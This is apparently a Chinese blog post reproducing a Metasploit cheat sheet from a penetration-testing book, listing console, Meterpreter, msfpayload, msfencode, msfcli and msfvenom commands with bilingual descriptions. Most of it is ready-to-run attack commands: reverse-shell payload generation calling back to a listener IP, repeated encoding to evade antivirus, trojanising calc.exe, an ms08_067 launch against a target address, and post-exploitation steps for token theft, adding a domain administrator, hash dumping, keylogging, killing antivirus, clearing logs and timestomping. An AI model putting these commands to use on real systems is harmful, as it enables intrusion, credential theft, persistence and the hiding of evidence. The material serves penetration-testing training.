title: MSF命令参考
date: 2015-06-09 9:50:00
tags:
- Penetration
- MSF
permalink: MSF-Cheat-Sheet
---

以下是Metasploit框架的各种接口与程序中最常使用的命令和语法参考，以及Meterpreter后渗透测试阶段的命令参考，里边的一些“多合一”命令将会大大简化攻击步骤。

## 一、MSF终端命令

`show exploits`
Show all exploits within the Framework.
列出Metasploit框架中的所有渗透攻击模块。

`show payloads`
Show all payloads within the Framework.
列出Metasploit框架中所有的攻击载荷。

`show auxiliary`
Show all auxiliary modules within the Framework.
列出Metasploit框架中的所有辅助攻击模块。

`search name`
Search for exploits or modules within the Framework.
查找Metasploit框架中所有的渗透攻击和其他模块。

`info`
Load information about a specific exploit or module.
展示出指定渗透攻击或模块的相关信息。

`use name`
Load an exploit or module (example: use windows/smb/psexec).
装载一个渗透攻击或者模块（例如：使用windows/smb.psexec）。

`LHOST`
Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.
你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要一个公共的IP地址，特别为反弹式shell使用。

`RHOST`
The remote host or the target.
远程主机或是目标主机。

`set function`
Set a specific value (for example,  LHOST or  RHOST ).
设置特定的配置参数（例如：设置本地或远程主机参数）。

`setg function`
Set a specific value globally (for example,  LHOST or  RHOST ).
以全局方式设置特定的配置参数（例如：设置本地或远程主机参数）。

`show options`
Show the options available for a module or exploit.
列出某个渗透攻击或模块中所有的配置参数。

`show targets`
Show the platforms supported by the exploit.
列出渗透攻击所支持的目标平台。

`set target num`
Specify a specific target index if you know the OS and service pack.
指定你所知道的目标的操作系统以及补丁版本类型。

`set payload payload`
Specify the payload to use.
指定想要使用的攻击载荷。

`show advanced`
Show advanced options.
列出所有高级配置选项。

`set autorunscript migrate -f`
Automatically migrate to a separate process upon exploit completion.
在渗透攻击完成后，将自动迁移到另一个进程。

`check`
Determine whether a target is vulnerable to an attack.
检测目标是否对选定渗透攻击存在相应安全漏洞。

`exploit`
Execute the module or exploit and attack the target.
执行渗透攻击或模块来攻击目标。

`exploit -j`
Run the exploit under the context of the job. (This will run the exploit in the background.)
在计划任务下进行渗透攻击（攻击将在后台进行）。

`exploit -z`
Do not interact with the session after successful exploitation.
渗透攻击成功后不与会话进行交互。

`exploit -e encoder`
Specify the payload encoder to use (example:  exploit –e shikata_ga_nai ).
制定使用的攻击载荷编码方式（例如：exploit -e shikata_ga_nai）。

`exploit -h`
Display help for the  exploit command.
列出exploit命令的帮助信息。

`sessions -l`
List available sessions (used when handling multiple shells).
列出可用的交互会话（在处理多个shell时使用）。

`sessions -l -v`
List all available sessions and show verbose fields, such as which vulnera-bility was used when exploiting the system.
列出所有可用的交互会话以及会话详细信息，例如：攻击系统时使用了哪个安全漏洞。

`sessions -s script`
Run a specific Meterpreter script on all Meterpreter live sessions.
在所有活跃的Meterpreter会话中运行一个特定的Meterpreter脚本。

`sessions -K`
Kill all live sessions.
杀死所有活跃的交互会话。

`sessions -c cmd`
Execute a command on all live Meterpreter sessions.
在所有活跃的Meterpreter会话上执行一个命令。

`sessions -u sessionID`
Upgrade a normal Win32 shell to a Meterpreter console.
升级一个普通的Win32 shell到Meterpreter shell。

`db_create name`
Create a database to use with database-driven attacks (example:  db_create autopwn).
创建一个数据库驱动攻击所要使用的数据库（例如：db_create autopwn）。

`db_connect name`
Create and connect to a database for driven attacks (example:  db_connect autopwn).
创建并连接一个数据库驱动攻击所要使用的数据库（例如：db_conect autopwn）。

`db_nmap`
Use nmap and place results in database. (Normal nmap syntax is supported, such as  –sT –v –P0.)
利用nmap并把扫描数据存储到数据库中（支持普通的nmap语法，例如：-sT -v -P0）。

`db_autopwn -h`
Display help for using  db_autopwn .
展示出db_autopwn命令的帮助信息。

`db_autopwn -p -r -e`
Run  db_autopwn against all ports found, use a reverse shell, and exploit all systems.
对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。

`db_destroy`
Delete the current database.
删除当前数据库。

`db_destroy user:password@host:port/database`
Delete database using advanced options.
使用高级选项来删除数据库。

## 二、Meterpreter命令

`help`
Open Meterpreter usage help.
打开Meterpreter使用帮助。

`run scriptname`
Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.
运行Meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。

`sysinfo`
Show the system information on the compromised target.
列出受控主机的系统信息。

`ls`
List the files and folders on the target.
列出目标主机的文件和文件夹信息。

`use priv`
Load the privilege extension for extended Meterpreter libraries.
加载特权提升扩展模块，来扩展Meterpreter库。

`ps`
Show all running processes and which accounts are associated with each process.
显示所有运行进程以及关联的用户账户。

`migrate PID`
Migrate to the specific process ID (PID is the target process ID gained from the  ps command).
迁移到一个指定的进程ID（PID号可通过ps命令从目标主机上获得）。

`use incognito`
Load incognito functions. (Used for token stealing and impersonation on a target machine.)
加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户）。

`list_tokens -u`
List available tokens on the target by user.
列出目标主机用户的可用令牌。

`list_tokens -g`
List available tokens on the target by group.
列出目标主机用户组的可用令牌。

`impersonate_token DOMAIN_NAME\\USERNAME`
Impersonate a token available on the target.
假冒目标主机上的可用令牌。

`steal_token PID`
Steal the tokens available for a given process and impersonate that token.
盗窃给定进行的可用令牌并进行令牌假冒。

`drop_token`
Stop impersonating the current token.
停止假冒当前令牌。

`getsystem`
Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.
通过各种攻击向量来提升到系统用户权限。

`shell`
Drop into an interactive shell with all available tokens.
以所有可用令牌来运行一个交互的Shell。

`execute -f cmd.exe -i`
Execute cmd.exe and interact with it.
执行cmd.exe命令并进行交互。

`execute -f cmd.exe -i -t`
Execute cmd.exe with all available tokens.
以所有可用令牌来执行cmd命令。

`execute -f cmd.exe -i -H -t`
Execute cmd.exe with all available tokens and make it a hidden process.
以所有可用令牌来执行cmd命令并隐藏该进程。

`rev2self`
Revert back to the original user you used to compromise the target.
回到控制目标主机的初始用户账户下。

`reg command`
Interact, create, delete, query, set, and much more in the target’s registry.
在目标主机注册表中进行交互，创建，删除，查询等操作。

`setdesktop number`
Switch to a different screen based on who is logged in.
切换到另一个用户界面（该功能基于哪些用户已登录）。

`screenshot`
Take a screenshot of the target’s screen.
对目标主机的屏幕进行截图。

`upload file`
Upload a file to the target.
向目标主机上传文件。

`download file`
Download a file from the target.
从目标主机下载文件。

`keyscan_start`
Start sniffing keystrokes on the remote target.
针对远程目标主机开启键盘记录功能。

`keyscan_dump`
Dump the remote keys captured on the target.
存储目标主机上捕获的键盘记录。

`keyscan_stop`
Stop sniffing keystrokes on the remote target.
停止针对目标主机的键盘记录。

`getprivs`
Get as many privileges as possible on the target.
尽可能多的获取目标主机上的特权。

`uictl enable keyboard/mouse`
Take control of the keyboard and/or mouse.
接管目标主机的键盘和鼠标。

`background`
Run your current Meterpreter shell in the background.
将你当前的Meterpreter shell转为后台执行。

`hashdump`
Dump all hashes on the target.
导出目标主机中的口令哈希值。

`use sniffer`
Load the sniffer module.
加载嗅探模块。

`sniffer_interfaces`
List the available interfaces on the target.
列出目标主机所有开放的网络接口。

`sniffer_dump interfaceID pcapname`
Start sniffing on the remote target.
在目标主机上启动嗅探。

`sniffer_start interfaceID packet-buffer`
Start sniffing with a specific range for a packet buffer.
在目标主机上针对特定范围的数据包缓冲区启动嗅探。

`sniffer_stats interfaceID`
Grab statistical information from the interface you are sniffing.
获取正在实施嗅探网络接口的统计数据。

`sniffer_stop interfaceID`
Stop the sniffer.
停止嗅探。

`add_user username password -h ip`
Add a user on the remote target.
在远程目标主机上添加一个用户。

`add_group_user "Domain Admins" username -h ip`
Add a username to the Domain Administrators group on the remote target.
将用户添加到目标主机的域管理员组中。

`clearev`
Clear the event log on the target machine.
清除目标主机上的日志记录。

`timestomp`
Change file attributes, such as creation date (antiforensics measure).
修改文件属性，例如修改文件的创建时间（反取证调查）。

`reboot`
Reboot the target machine.
重启目标主机。

## 三、MSFpyaload命令

`msfpayload -h`
List available payloads.
MSFpayload的帮助信息。

`msfpayload windows/meterpreter/bind_tcp O`
List available options for the  windows/meterpreter/bind_tcp payload (all of these can use any payload).
列出所有windows/meterpreter/bind_tcp下攻击载荷的配置项（任何攻击载荷都是可以配置的）。

`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X > payload.exe`
Create a Meterpreter reverse_tcp payload to connect back to 192.168.1.5 and on port 443, and then save it as a Windows Portable Executable named payload.exe.
创建一个Meterpreter的reverse_tcp攻击载荷，回连到192.168.1.5的443端口，将其保存为名为payload.exe的Windows可执行程序。

`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R > payload.raw`
Same as above, but export as raw format. This will be used later in msfencode.
与上面生成同样的攻击载荷，但导出成原始格式的文件，该文件将在后面的MSFencode中使用。


`msfpayload windows/meterpreter/bind_tcp LPORT=443 C > payload.c`
Same as above but export as C-formatted shellcode.
与上面生成同样的攻击载荷，但导出成C格式的shellcode。

`msfpayload windows/meterpreter/bind_tcp LPORT=443 J > payload.java`
Export as %u encoded JavaScript.
导出成以%u编码方式的JavaScript语言字符串。

## 四、MSFencode命令

`msfencode -h`
Display the msfencode help.
列出MSFencode的帮助信息。

`msfencode -l`
List the available encoders.
列出所有可用的编码器。

`msfencode -t (c, elf, exe, java, js_le, js_be, perl, raw, ruby, vba, vbs, loop-vbs, asp, war, macho)`
Format to display the encoded buffer.
显示编码器缓冲区的格式。

`msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe`
Encode payload.raw with shikata_ga_nai five times and export it to an output file named encoded_payload.exe.
使用shikata_ga_nai编码器对payload.raw文件进行5次编码，然后导出一个名为encoded_payload.exe的文件。

`msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -e x86/ _countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe`
Create a multi-encoded payload.
创建一个经过多重编码格式签到编码的攻击载荷。

`msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c`
Create pure alphanumeric shellcode where ESI points to the shellcode; output in C-style notation.
创建一个纯字母数字的shellcode，由ESI寄存器执行shellcode，以C语言格式输出。

## 五、MSFcli命令

`msfcli | grep exploit`
Show only exploits.
仅列出渗透攻击模块。

`msfcli | grep exploit/windows`
Show only Windows exploits.
仅列出与Windows相关的渗透攻击模块。

`msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.142 E`
Launch  ms08_067_netapi exploit at 172.16.32.142 with a bind_tcp payload being delivered to listen on port 443.
对172.16.32.142发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在443端口进行监听。

## 六、Metasploit高级忍术

```bash
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe
```
创建一个反弹式的Meterpreter攻击载荷，回连到192.168.1.5主机的443端口，使用calc.exe作为载荷后门程序，让载荷执行流一直运行在被攻击的应用程序中，最后生成以.shikata_ga_nai编码器编码后的攻击载荷可执行程序paylaod.exe

```bash
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe
```
创建一个反弹式的Meterpreter攻击载荷，回连到192.168.1.5主机的443端口，使用calc.exe作为载荷后门程序，不让载荷执行流一直运行在被攻击的应用程序中，同时在攻击载荷执行后也不会在目标主机上弹出任何信息。这种配置非常有用，当你通过浏览器漏洞控制了远程主机，并不想让计算器程序打开呈现在目标用户前面。同样，最后生成用.shikata_ga_nai编码的攻击载荷程序payload.exe。

```bash
msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe && msfcli multi/handler PAYLOAD=windows/ meterpreter/bind_tcp LPORT=443 E
```
创建一个raw格式bind_tcp模式Meterpreter攻击载荷，用shikata_ga_nai编码7次，输出一payload.exe命名的Windows可执行程序文件，同时启用多路监听方式进行执行。

## 七、MSFvenom

利用MSFvenom，一个集成套件，来创建和编码你的攻击载荷。
```bash
msfvenom --payload
windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai LHOST=172.16.1.32 LPORT=443 > msf.exe
[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)
root@bt://opt/framework3/msf3#
```
这一行命令就可以创建一个攻击载荷并自动产生可执行文件格式。

## 八、Meterpreter后渗透攻击阶段命令

在Windows主机上使用Meterpreter进行提权操作：
```bash
meterpreter > use priv
meterpreter > getsystem
```

从一个给定的进程ID中窃取一个域管理员组令牌，添加一个域账户，并把域账户添加到域管理员组中：
```bash
meterpreter > ps

meterpreter > steal_token 1784
meterpreter > shell

C:\Windows\system32>net user metasploit p@55w0rd /ADD /DOMAIN
C:\Windows\system32>net group "Domain Admins" metasploit /ADD /DOMAIN
```

从SAM数据库中导出密码的哈希值：
```bash
meterpreter > use priv
meterpreter > getsystem
meterpreter > hashdump
```
提示：在Windows 2008中，如果getsystem命令和hashdump命令导出异常情况时，你需要迁移到一个以SYSMTEM系统权限运行的进程中。

自动迁移到一个独立进程：
```bash
meterpreter > run migrate
```
通过Meterpreter的killav脚本来杀死目标主机运行的杀毒软件进程：
```bash
meterpreter > run killav
```

针对一个特定的进程捕获目标主机上的键盘记录：
```bash
meterpreter > ps
meterpreter > migrate 1436
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```

用匿名方式来假冒管理员：
```bash
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > use priv
meterpreter > getsystem
meterpreter > list_tokens -u
meterpreter > impersonate_token IHAZSECURITY\\Administrator
```

查看目标主机都采取了哪些防护措施，列出帮助菜单，关闭防火墙以及其他我们发现的防护措施：
```bash
meterpreter > run getcountermeasure
meterpreter > run getcountermeasure -h
meterpreter > run getcountermeasure -d -k
```

识别被控制的主机是否是一台虚拟机：
```bash
meterpreter > run checkvm
```

在一个Meterpreter会话界面中使用cmd shell：
```bash
meterpreter > shell
```

获取目标主机的图形界面（VNC）：
```bash
meterpreter > run vnc
```

使正在运行的Meterpreter界面在后台运行：
```bash
meterpreter > background
```

绕过Windows的用户账户控制（UAC）机制：
```bash
meterpreter > run post/windows/escalate/bypassuac
```

导出苹果OS-X系统的口令哈希值：
```bash
meterpreter > run post/osx/gather/hashdump
```

导出Linux系统的口令哈希值：
```bash
meterpreter > run post/linux/gather/hashdump
```

----------

## 参考

1. 《Metasploit渗透测试指南》附录B
2. 《Metasploit-The Penetration Tester's Guide》B:Cheat Sheet